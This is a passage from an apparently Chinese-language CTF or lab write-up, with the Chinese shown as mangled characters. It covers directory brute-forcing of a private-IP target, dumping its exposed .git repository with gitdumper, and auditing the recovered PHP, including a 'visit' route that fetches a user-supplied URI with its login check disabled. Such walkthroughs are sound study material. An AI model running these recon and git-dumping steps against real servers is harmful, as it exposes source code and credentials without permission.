<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æ‰«ä¸€ä¸‹ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# dirsearch -u  <span class="number">192.168</span><span class="number">.34</span><span class="number">.83</span> </span><br><span class="line">/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class="number">23</span>: DeprecationWarning: pkg_resources <span class="keyword">is</span> deprecated as an API. See https:<span class="comment">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  <span class="keyword">from</span> pkg_resources <span class="keyword">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0<span class="number">.4</span><span class="number">.3</span></span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="number">25</span> | Wordlist size: <span class="number">11460</span></span><br><span class="line"></span><br><span class="line">Output File: /root/tmp/reports/_192<span class="number">.168</span><span class="number">.34</span><span class="number">.83</span>/_25<span class="number">-04</span><span class="number">-24</span>_19<span class="number">-53</span><span class="number">-39.</span>txt</span><br><span class="line"></span><br><span class="line">Target: http:<span class="comment">//192.168.34.83/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[19:53:45]</span> Starting: </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /.config/gcloud/access_tokens.db                  </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /.config/gcloud/credentials.db                    </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /.db                                              </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">997</span>B  - /.git/hooks/                                      </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">307</span>B  - /.git/branches/</span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -   <span class="number">73</span>B  - /.git/description                                 </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -   <span class="number">92</span>B  - /.git/config                                      </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">301</span> -  <span class="number">311</span>B  - /.git  -&gt;  http:<span class="comment">//192.168.34.83/.git/             </span></span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -   <span class="number">14</span>B  - /.git/COMMIT_EDITMSG</span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -   <span class="number">23</span>B  - /.git/HEAD</span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">726</span>B  - /.git/                                            </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">339</span>B  - /.git/info/                                       </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">441</span>B  - /.git/index                                       </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">369</span>B  - /.git/logs/</span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">160</span>B  - /.git/logs/HEAD                                   </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">240</span>B  - /.git/info/exclude</span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">301</span> -  <span class="number">321</span>B  - /.git/logs/<span class="built_in">ref</span>s  -&gt;  http:<span class="comment">//192.168.34.83/.git/logs/refs/</span></span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">160</span>B  - /.git/logs/<span class="built_in">ref</span>s/heads/master                      </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">301</span> -  <span class="number">327</span>B  - /.git/logs/<span class="built_in">ref</span>s/heads  -&gt;  http:<span class="comment">//192.168.34.83/.git/logs/refs/heads/</span></span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">633</span>B  - /.git/objects/                                    </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">301</span> -  <span class="number">322</span>B  - /.git/<span class="built_in">ref</span>s/heads  -&gt;  http:<span class="comment">//192.168.34.83/.git/refs/heads/</span></span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -   <span class="number">41</span>B  - /.git/<span class="built_in">ref</span>s/heads/master                           </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">200</span> -  <span class="number">373</span>B  - /.git/<span class="built_in">ref</span>s/                                       </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">301</span> -  <span class="number">321</span>B  - /.git/<span class="built_in">ref</span>s/tags  -&gt;  http:<span class="comment">//192.168.34.83/.git/refs/tags/</span></span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccess.bak1                                   </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.ht_wsr.txt                                      </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccess.orig                                   </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccessOLD2                                    </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccess_orig</span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccess.sample</span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccess_extra</span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccess_sc</span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htm                                             </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htpasswds                                       </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htpasswd_test                                   </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccess.save                                   </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccessBAK                                     </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.html</span><br><span class="line"><span class="string">[19:53:48]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.httr-oauth                                      </span><br><span class="line"><span class="string">[19:53:47]</span> <span class="number">403</span> -  <span class="number">276</span>B  - /.htaccessOLD</span><br><span class="line"><span class="string">[19:53:49]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /.svn/wc.db                                       </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/index.html                               </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/a1stats/a1disp.cgi                       </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/awstats/</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/htimage.exe?<span class="number">2</span>,<span class="number">2</span>                          </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/imagemap.exe?<span class="number">2</span>,<span class="number">2</span>                         </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/htmlscript</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/awstats.pl</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/                                         </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/login.php                                </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/mt.cgi</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/mt/mt.cgi</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/login</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/login.cgi</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/mt-xmlrpc.cgi</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/mt/mt-xmlrpc.cgi</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/test.cgi</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/mt7/mt.cgi</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/php.ini                                  </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">200</span> -  <span class="number">820</span>B  - /cgi-bin/printenv</span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/ViewLog.asp                              </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">200</span> -    <span class="number">1</span>KB - /cgi-bin/test-cgi                                 </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/mt7/mt-xmlrpc.cgi                        </span><br><span class="line"><span class="string">[19:53:57]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /cgi-bin/printenv.pl                              </span><br><span class="line"><span class="string">[19:54:00]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /devdata.db                                       </span><br><span class="line"><span class="string">[19:54:00]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /ehthumbs.db                                      </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">200</span> -    <span class="number">1</span>KB - /log                                              </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/error_log                                    </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/exception.log</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/log.txt</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/errors.log</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/log.log</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/error.log                                    </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/access.log</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/access_log</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/                                             </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/authorizenet.log                             </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/librepag.log</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/payment_authorizenet.log</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/payment.log</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/old                                          </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/development.log                              </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/payment_paypal_express.log                   </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/server.log                                   </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/production.log                               </span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/test.log</span><br><span class="line"><span class="string">[19:54:05]</span> <span class="number">404</span> -  <span class="number">273</span>B  - /log/www-error.log                                </span><br><span class="line"><span class="string">[19:54:07]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /mysqlitedb.db                                    </span><br><span class="line"><span class="string">[19:54:07]</span> <span class="number">200</span> -    <span class="number">1</span>KB - /nginx.conf                                       </span><br><span class="line"><span class="string">[19:54:10]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /pwd.db                                           </span><br><span class="line"><span class="string">[19:54:13]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /spwd.db                                          </span><br><span class="line"><span class="string">[19:54:14]</span> <span class="number">200</span> -    <span class="number">0</span>B  - /test.php                                         </span><br><span class="line"><span class="string">[19:54:15]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /Thumbs.db                                        </span><br><span class="line"><span class="string">[19:54:15]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /thumbs.db                                        </span><br><span class="line"><span class="string">[19:54:16]</span> <span class="number">403</span> -  <span class="number">548</span>B  - /users.db                                         </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°æœ‰gitç›®å½•  è¯´æ˜å­˜åœ¨gitä»“åº“æ³„æ¼ï¼ŒæŠŠè¿™ä¸ªgitä»“åº“ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åç”¨gitdumperå·¥å…·æ¢å¤ä¸€ä¸‹gitä»“åº“<br><a href="https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh">https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh</a><br>çœ‹lingdongä½¬çš„wpä¹Ÿå­¦åˆ°å¦ä¸€ä¸ªå·¥å…·å¯ä»¥æ¢å¤gitä»“åº“  githack<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># ./gitdumper.sh http://192.168.34.83/.git/ ./recovery</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"><span class="comment"># GitDumper is part of https://github.com/internetwache/GitTools</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Developed and maintained by @gehaxelt from @internetwache</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span></span><br><span class="line"><span class="comment"># Only for educational purposes!</span></span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[<span class="operator">*</span>] Destination folder does not exist</span><br><span class="line">[<span class="operator">+</span>] Creating .<span class="operator">/</span>recovery<span class="operator">/</span>.git<span class="symbol">/</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> HEAD</span><br><span class="line">[-] <span class="params">Downloaded:</span> objects<span class="symbol">/info/packs</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> description</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> config</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> COMMIT_EDITMSG</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> index</span><br><span class="line">[-] <span class="params">Downloaded:</span> packed-refs</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> refs<span class="symbol">/heads/master</span></span><br><span class="line">[-] <span class="params">Downloaded:</span> refs<span class="symbol">/remotes/origin/HEAD</span></span><br><span class="line">[-] <span class="params">Downloaded:</span> refs<span class="symbol">/stash</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> logs<span class="symbol">/HEAD</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> logs<span class="symbol">/refs/heads/master</span></span><br><span class="line">[-] <span class="params">Downloaded:</span> logs<span class="symbol">/refs/remotes/origin/HEAD</span></span><br><span class="line">[-] <span class="params">Downloaded:</span> info<span class="symbol">/refs</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> info<span class="symbol">/exclude</span></span><br><span class="line">[-] <span class="params">Downloaded:</span> <span class="symbol">/refs/wip/index/refs/heads/master</span></span><br><span class="line">[-] <span class="params">Downloaded:</span> <span class="symbol">/refs/wip/wtree/refs/heads/master</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> objects<span class="symbol">/b4/09ae52f1f27e51c0041a1a9079d301133266fa</span></span><br><span class="line">[-] <span class="params">Downloaded:</span> objects<span class="symbol">/00/00000000000000000000000000000000000000</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> objects<span class="symbol">/64/42f9558de272627d5bdc2baa8808e3e46e0918</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> objects<span class="symbol">/af/f22f58c8dcfd5535cab50dca5b2bb2c2b79435</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> objects<span class="symbol">/3a/54667fdd1357fe97cc0030aca0543650733ba8</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> objects<span class="symbol">/0e/926b0dccc3ebabc70d5ec935c8940f1111363a</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> objects<span class="symbol">/fb/3f381eefe8c33ea7151921e637f9a8ee7cad15</span></span><br><span class="line">[<span class="operator">+</span>] <span class="params">Downloaded:</span> objects<span class="symbol">/54/e3cc3f64b031833ce92d7a677f99c8f3ee0750</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># cd recovery </span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp<span class="operator">/</span>recovery]</span><br><span class="line">â””â”€<span class="comment"># ls -al</span></span><br><span class="line">total <span class="number">12</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> root root <span class="number">4096</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> .</span><br><span class="line">drwxr-xr-x <span class="number">9</span> root root <span class="number">4096</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> ..</span><br><span class="line">drwxr-xr-x <span class="number">6</span> root root <span class="number">4096</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> .git</span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp<span class="operator">/</span>recovery]</span><br><span class="line">â””â”€<span class="comment"># cd .git    </span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp<span class="operator">/</span>recovery<span class="operator">/</span>.git]</span><br><span class="line">â””â”€<span class="comment"># ls -al</span></span><br><span class="line">total <span class="number">44</span></span><br><span class="line">drwxr-xr-x  <span class="number">6</span> root root <span class="number">4096</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> .</span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> ..</span><br><span class="line"><span class="operator">-</span>rw-r--r--  <span class="number">1</span> root root   <span class="number">14</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> COMMIT_EDITMSG</span><br><span class="line"><span class="operator">-</span>rw-r--r--  <span class="number">1</span> root root   <span class="number">92</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> config</span><br><span class="line"><span class="operator">-</span>rw-r--r--  <span class="number">1</span> root root   <span class="number">73</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> description</span><br><span class="line"><span class="operator">-</span>rw-r--r--  <span class="number">1</span> root root   <span class="number">23</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> HEAD</span><br><span class="line"><span class="operator">-</span>rw-r--r--  <span class="number">1</span> root root  <span class="number">441</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> index</span><br><span class="line">drwxr-xr-x  <span class="number">2</span> root root <span class="number">4096</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> info</span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> logs</span><br><span class="line">drwxr-xr-x <span class="number">11</span> root root <span class="number">4096</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> objects</span><br><span class="line">drwxr-xr-x  <span class="number">5</span> root root <span class="number">4096</span> Apr <span class="number">24</span> <span class="number">19</span>:<span class="number">45</span> refs</span><br><span class="line">                                              </span><br></pre></td></tr></table></figure></div>
<p>æˆ‘æ˜¾ç¤ºçœ‹äº†config  ä½†æ˜¯é‡Œé¢æ²¡æœ‰æœ‰ç”¨çš„ä¿¡æ¯ ç„¶ågptäº†ä¸€ä¸‹ï¼ŒçŸ¥é“æœ‰ä¸€ä¸ª git check â€“ å‘½ä»¤å¯ä»¥è¿˜åŸå·¥ä½œåŒºä¹‹å‰çš„æ–‡ä»¶è¿™é‡Œæœ‰ä¸€ä¸ªindexæˆ‘å°±æ¢å¤ä¸€ä¸‹index.php </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp/recovery/.git]</span><br><span class="line">â””â”€<span class="comment"># cd ../   </span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp/recovery]</span><br><span class="line">â””â”€<span class="comment"># git checkout -- index.php</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp/recovery]</span><br><span class="line">â””â”€<span class="comment"># ls -al</span></span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x<span class="number"> 3 </span>root root<span class="number"> 4096 </span>Apr<span class="number"> 24 </span>19:52 .</span><br><span class="line">drwxr-xr-x<span class="number"> 9 </span>root root<span class="number"> 4096 </span>Apr<span class="number"> 24 </span>19:45 ..</span><br><span class="line">drwxr-xr-x<span class="number"> 6 </span>root root<span class="number"> 4096 </span>Apr<span class="number"> 24 </span>19:52 .git</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>root root<span class="number"> 3951 </span>Apr<span class="number"> 24 </span>19:52 index.php</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åå°±æ˜¯ç…ç†¬çš„ä»£ç å®¡è®¡æ—¶é—´<br>é¦–å…ˆæœ‰ä¸€ä¸ªç”¨æˆ·è®¤è¯å’Œæ•°æ®åº“</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 401 Unauthorized&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;Please login first&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_db_connection</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;/var/www/html/database.db&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>ç„¶åæ˜¯visitè¿™ä¸ªè·¯ç”±</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="variable">$path</span> === <span class="string">&#x27;visit&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment">#$username = verify_user();</span></span><br><span class="line">    <span class="variable">$uri</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;uri&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$uri</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&#x27;HTTP/1.1 400 Bad Request&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;URI is required&quot;</span>]);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="string">&quot;http://127.0.0.1:8080/test.php?uri=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$uri</span>));</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, [</span><br><span class="line">        <span class="string">&quot;Host: 127.0.0.1:8080&quot;</span>  </span><br><span class="line">    ]);</span><br><span class="line">    <span class="variable">$res</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">curl_errno</span>(<span class="variable">$ch</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;cURL error calling test.php: &quot;</span> . <span class="title function_ invoke__">curl_error</span>(<span class="variable">$ch</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;test.php response: &quot;</span> . <span class="variable">$response</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/json&#x27;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&quot;message&quot;</span> =&gt; <span class="string">&quot;Bot is visiting: <span class="subst">$uri</span>&quot;</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
